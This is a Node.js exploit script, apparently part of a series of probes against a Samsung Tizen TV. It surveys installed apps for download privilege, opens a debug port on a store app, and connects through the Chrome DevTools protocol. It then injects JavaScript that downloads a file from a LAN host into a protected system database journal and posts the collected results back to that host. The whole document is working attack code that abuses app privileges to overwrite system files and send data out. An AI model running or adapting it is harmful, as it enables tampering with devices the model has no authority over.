"use strict";
/* p28: find WAS app with download privilege (all install roots), 0 debug via shell, CDP, deliver journal */
var fs = require('fs');
var cp = require('child_process');
var net = require('net');
var http = require('http');
var crypto = require('crypto');
var HOST = '192.168.1.62', PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p28', results: {}, log: [] };
function L(s){ R.log.push(String(s).substring(0,500)); }
function run(cmd, timeout){
  try { return cp.execSync(cmd, {timeout:timeout||30000, maxBuffer:16*1024*1024}).toString().trim(); }
  catch(e){ var o=''; if(e.stdout)o+=e.stdout.toString(); if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();
    return '[exit '+(e.status!=null?e.status:'?')+'] '+(o||(e&&e.message)||'unknown'); }
}
function postRaw(path, text){
  var buf = new Buffer(text,'utf8');
  var hdr = 'POST '+path+' HTTP/1.1\r\nHost: '+HOST+':9999\r\nContent-Type: text/plain\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';
  try { var s=net.connect(PORT,HOST); s.on('connect',function(){ s.write(hdr); var off=0,iv=setInterval(function(){ if(off>=buf.length){clearInterval(iv);setTimeout(function(){s.destroy();},3000);return;} s.write(buf.slice(off,off+4096)); off+=4096;},100); setTimeout(function(){s.destroy();},120000);}); s.on('error',function(e){L('post err '+e.message);}); } catch(e){ L('post ctor '+e); }
}
var JURL = 'http://192.168.1.62:9999/appctx_hot_journal';
var JDEST = '/opt/dbspace/.app-context.db-journal';

R.results.live_before = run('md5sum /opt/dbspace/.app-context.db 2>&1', 10000);
R.results.journal_before = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);

// 1. where are the store apps installed?
R.results.find_fmtv = run("find /usr/apps /opt/usr/apps -maxdepth 4 \\( -name 'config.xml' -o -name 'tizen-manifest.xml' \\) 2>/dev/null | xargs grep -l 'FreeMyTV\\|com.samsung.tv.store' 2>/dev/null | head -10", 40000);
R.results.optusr_ls = run('ls /opt/usr/apps/ 2>&1 | head -40', 10000);

// 2. download-privilege census across ALL WAS install roots
R.results.dl_census = run("for f in /usr/apps/*/config.xml /opt/usr/apps/*/config.xml /opt/usr/apps/*/res/wgt/config.xml; do [ -f \"$f\" ] || continue; if grep -q 'privilege/download' \"$f\" 2>/dev/null; then echo \"DL: $f\"; fi; done 2>&1 | head -30", 60000);
R.results.dl_census_count = run("for f in /usr/apps/*/config.xml /opt/usr/apps/*/config.xml /opt/usr/apps/*/res/wgt/config.xml; do [ -f \"$f\" ] || continue; if grep -q 'privilege/download' \"$f\" 2>/dev/null; then echo X; fi; done 2>&1 | wc -l", 60000);

// 3. check the two store apps' manifests directly (find dirs first)
R.results.store_fmtv_cfg = run("for d in /opt/usr/apps/*/ /usr/apps/*/; do for c in \"$d/config.xml\" \"$d/res/wgt/config.xml\"; do if [ -f \"$c\" ] && grep -q 'FreeMyTV\\|com.samsung.tv.store' \"$c\" 2>/dev/null; then echo \"=== $c ===\"; grep -oE 'id=\"[^\"]*\"|appid=\"[^\"]*\"|privilege/[a-z.]*|<name>[^<]*</name>|type=\"[a-z]*\"' \"$c\" 2>/dev/null | head -12; fi; done; done 2>&1 | head -60", 60000);

// 4. 0 debug candidates — run directly via shell
var candidates = ['FreeMyTVio.FreeMyTV', 'com.samsung.tv.store'];
function tryDebug(i, port, rawOut){
  if (port) { deliverViaCDP(port, rawOut); return; }
  if (i >= candidates.length) {
    R.results.note = 'no debug port from any candidate';
    finish();
    return;
  }
  var aid = candidates[i];
  L('0 debug ' + aid);
  var out = run('0 debug ' + aid + ' 2>&1', 20000);
  R.results['debug_' + aid.replace(/[^a-zA-Z0-9]/g,'_')] = String(out).substring(0, 800);
  // parse: first ':' then up to 6 chars, strip spaces
  var m = out.match(/:\s*(\d{3,6})\s/);
  var p = null;
  if (m) p = Number(m[1]);
  else {
    var ci = out.indexOf(':');
    if (ci >= 0) {
      var seg = out.substring(ci + 1, ci + 12).replace(/[^0-9]/g, '');
      if (seg.length >= 3) p = Number(seg.substring(0, 6));
    }
  }
  R.results['debugport_' + aid.replace(/[^a-zA-Z0-9]/g,'_')] = p;
  tryDebug(i + 1, p, out);
}

function deliverViaCDP(port, rawOut){
  R.results.cdp_port = port;
  R.results.cdp_raw = String(rawOut).substring(0, 500);
  // fetch /json first to find webSocketDebuggerUrl
  var req = http.get({ host: '127.0.0.1', port: port, path: '/json', timeout: 5000 }, function(res){
    var data = '';
    res.on('data', function(c){ data += c; });
    res.on('end', function(){
      R.results.json_raw = data.substring(0, 1500);
      var m2 = data.match(/\"webSocketDebuggerUrl\"\s*:\s*\"([^\"]+)\"/);
      if (!m2) { R.results.note = 'no wsUrl in /json'; finish(); return; }
      var wsUrl = m2[1];
      var mm = wsUrl.match(/^ws:\/\/[^/]+(.*)$/);
      var wsPath = mm ? mm[1] : '/devtools/page/1';
      startCDP(port, wsPath);
    });
  });
  req.on('error', function(e){ R.results.json_err = String(e); finish(); });
  req.on('timeout', function(){ req.abort(); R.results.json_err = 'timeout'; finish(); });
}

// ---- minimal WS client (from p24) ----
function wsFrameText(str){
  var payload = Buffer.from(str, 'utf8');
  var len = payload.length;
  var mask = crypto.randomBytes(4);
  var lenBytes;
  if (len < 126) { lenBytes = Buffer.from([0x80 | len]); }
  else if (len < 65536) { lenBytes = Buffer.concat([Buffer.from([0x80|126]), Buffer.from([ (len>>8)&0xff, len&0xff ])]); }
  else { lenBytes = Buffer.concat([Buffer.from([0x80|127]), Buffer.from([0,0,0,0]), Buffer.from([ (len>>>24)&0xff,(len>>>16)&0xff,(len>>>8)&0xff, len&0xff ])]); }
  var masked = Buffer.alloc(len);
  for (var i=0;i<len;i++){ masked[i] = payload[i] ^ mask[i % 4]; }
  return Buffer.concat([Buffer.from([0x81]), lenBytes, mask, masked]);
}
function parseFrames(buf, handlers){
  var pos = 0;
  while (true) {
    if (buf.length - pos < 2) return buf.slice(pos);
    var b0 = buf[pos], b1 = buf[pos+1];
    var opcode = b0 & 0x0f;
    var masked = (b1 & 0x80) !== 0;
    var len = b1 & 0x7f;
    var p = pos + 2;
    if (len === 126) { if (buf.length-p < 2) return buf.slice(pos); len = buf.readUInt16BE(p); p += 2; }
    else if (len === 127) { if (buf.length-p < 8) return buf.slice(pos); len = Number(buf.readUInt32BE(p+4)); p += 8; }
    var maskKey = null;
    if (masked) { if (buf.length-p < 4) return buf.slice(pos); maskKey = buf.slice(p, p+4); p += 4; }
    if (buf.length - p < len) return buf.slice(pos);
    var payload = buf.slice(p, p+len);
    if (masked) { var m = Buffer.alloc(len); for (var i=0;i<len;i++){ m[i] = payload[i] ^ maskKey[i%4]; } payload = m; }
    p += len;
    if (opcode === 0x8) { handlers.onClose && handlers.onClose('server close'); }
    else if (opcode === 0x9) { handlers.onPing && handlers.onPing(); }
    else if (opcode === 0x1 || opcode === 0x2) { handlers.onMessage && handlers.onMessage(payload.toString('utf8')); }
    pos = p;
    if (pos >= buf.length) return Buffer.alloc(0);
  }
}
function WSClient(port, path, handlers){
  var socket = net.connect(port, '127.0.0.1');
  var buf = Buffer.alloc(0);
  var upgraded = false;
  var pending = [];
  socket.setTimeout(25000);
  socket.on('connect', function(){
    var key = crypto.randomBytes(16).toString('base64');
    var req = 'GET ' + path + ' HTTP/1.1\r\n' +
      'Host: 127.0.0.1:' + port + '\r\n' +
      'Upgrade: websocket\r\n' +
      'Connection: Upgrade\r\n' +
      'Sec-WebSocket-Key: ' + key + '\r\n' +
      'Sec-WebSocket-Version: 13\r\n' +
      '\r\n';
    socket.write(req);
  });
  socket.on('data', function(chunk){
    buf = Buffer.concat([buf, chunk]);
    if (!upgraded) {
      var idx = buf.indexOf('\r\n\r\n');
      if (idx >= 0) {
        var header = buf.slice(0, idx).toString();
        if (header.indexOf('101') >= 0) {
          upgraded = true;
          buf = buf.slice(idx + 4);
          pending.forEach(function(f){ socket.write(f); });
          pending = [];
        } else {
          handlers.onError && handlers.onError('WS upgrade failed: ' + header.substring(0,200));
          socket.destroy();
        }
      }
      return;
    }
    try { buf = parseFrames(buf, { onMessage: handlers.onMessage, onClose: handlers.onClose, onPing: function(){} }); }
    catch(e){ handlers.onError && handlers.onError('parse: '+e); }
  });
  socket.on('error', function(e){ handlers.onError && handlers.onError(String(e)); });
  socket.on('timeout', function(){ socket.destroy(); });
  socket.on('close', function(){ handlers.onClose && handlers.onClose('socket close'); });
  return { send: function(str){ var f = wsFrameText(str); if (!upgraded) pending.push(f); else socket.write(f); }, close: function(){ socket.destroy(); } };
}

function startCDP(port, wsPath){
  var setupJS = '(function(){ window.__dl={start:Date.now(),tizen:typeof tizen,dl:(typeof tizen!=="undefined")?typeof tizen.download:"none",status:"pending",progress:"",err:"",done:""}; try{ tizen.download.download('+JSON.stringify(JURL)+', '+JSON.stringify(JDEST)+', function(d,t){window.__dl.progress=d+"/"+t;}, function(e){window.__dl.err=String(e&&e.message||e);window.__dl.status="error";}, function(d,t){window.__dl.done=d+"/"+t;window.__dl.status="complete";}); window.__dl.status="started"; }catch(e){window.__dl.err=String(e);window.__dl.status="exception";} return JSON.stringify(window.__dl); })()';
  var ws = WSClient(port, wsPath, {
    onMessage: function(text){
      try {
        var msg = JSON.parse(text);
        if (msg.id === 101) {
          R.results.eval_setup = JSON.stringify(msg.result ? (msg.result.result ? msg.result.result.value : msg.result) : msg).substring(0,800);
          if (msg.exceptionDetails) R.results.eval_exception = JSON.stringify(msg.exceptionDetails).substring(0,500);
          setTimeout(function(){ ws.send(JSON.stringify({ id:102, method:'Runtime.evaluate', params:{ expression:'JSON.stringify(window.__dl)', returnByValue:true } })); }, 25000);
        }
        if (msg.id === 102) {
          R.results.eval_readback = JSON.stringify(msg.result ? (msg.result.result ? msg.result.result.value : msg.result) : msg).substring(0,800);
          R.results.journal_after = run('md5sum /opt/dbspace/.app-context.db-journal 2>&1', 10000);
          R.results.dbspace_after = run('ls -la /opt/dbspace/ 2>&1 | grep -iE "app-context" | head -20', 10000);
          ws.close();
          finish();
        }
      } catch(e){ R.results.cdp_parse_err = String(e); }
    },
    onClose: function(why){ R.results.ws_close = R.results.ws_close || why; },
    onError: function(e){ R.results.ws_error = String(e); }
  });
  setTimeout(function(){ ws.send(JSON.stringify({ id:100, method:'Runtime.enable', params:{} })); }, 800);
  setTimeout(function(){ ws.send(JSON.stringify({ id:101, method:'Runtime.evaluate', params:{ expression: setupJS, returnByValue:true } })); }, 2000);
}

function finish(){
  if (R.results.final) return;
  R.results.final = 'done ' + new Date().toISOString();
  postRaw('/p28info', JSON.stringify(R));
  L('p28 done');
}

tryDebug(0, null, null);
